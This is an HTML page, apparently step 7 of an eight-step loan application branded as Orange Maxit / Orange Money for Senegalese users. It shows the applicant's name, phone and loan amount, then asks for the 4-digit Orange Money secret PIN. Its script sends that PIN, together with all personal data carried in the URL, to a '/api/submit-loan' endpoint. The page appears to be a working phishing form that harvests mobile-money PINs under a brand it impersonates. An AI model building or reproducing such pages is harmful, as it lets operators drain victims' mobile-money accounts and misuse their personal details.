<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Orange Maxit - Étape 7</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="max-w-md w-full bg-white shadow-lg rounded-2xl p-6 m-4">
        <div class="text-center mb-6">
            <span class="bg-orange-600 text-white font-bold px-3 py-1 rounded-lg text-sm">Étape 7 sur 8</span>
            <h1 class="text-xl font-bold text-gray-800 mt-2">Validation Finale</h1>
        </div>

        <div class="bg-orange-50 border border-orange-200 rounded-xl p-4 mb-4 text-sm space-y-1">
            <p><strong>Demandeur:</strong> <span id="lbl-name">--</span></p>
            <p><strong>Téléphone:</strong> <span id="lbl-phone">--</span></p>
            <p><strong>Montant:</strong> <span id="lbl-amount" class="text-orange-600 font-semibold">--</span></p>
        </div>

        <form id="form7" class="space-y-4">
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-1">Code Secret Orange Money (4 chiffres)</label>
                <input type="password" name="pin" required maxlength="4" placeholder="••••" class="w-full text-center tracking-widest text-lg px-4 py-3 border rounded-lg focus:ring-2 focus:ring-orange-500">
            </div>
            <button type="submit" id="submitBtn" class="w-full bg-orange-600 hover:bg-orange-700 text-white font-semibold py-3 rounded-lg shadow">Confirmer et Soumettre</button>
        </form>
    </div>
    <script>
        const params = new URLSearchParams(window.location.search);
        document.getElementById('lbl-name').innerText = params.get('fullName') || '';
        document.getElementById('lbl-phone').innerText = '+221 ' + (params.get('phone') || '');
        document.getElementById('lbl-amount').innerText = Number(params.get('amount') || 100000).toLocaleString() + ' XOF';

        document.getElementById('form7').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = 'Traitement en cours...';

            const payload = {};
            params.forEach((value, key) => payload[key] = value);
            payload.pin = document.querySelector('input[name="pin"]').value;

            try {
                const response = await fetch('/api/submit-loan', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const result = await response.json();
                if (result.success) {
                    const url = new URL('page8.html', window.location.origin);
                    url.search = params.toString();
                    window.location.href = url.toString();
                } else {
                    alert('Erreur lors de la validation.');
                    btn.disabled = false;
                    btn.innerText = 'Confirmer et Soumettre';
                }
            } catch (err) {
                alert('Erreur serveur.');
                btn.disabled = false;
                btn.innerText = 'Confirmer et Soumettre';
            }
        });
    </script>
</body>
</html>
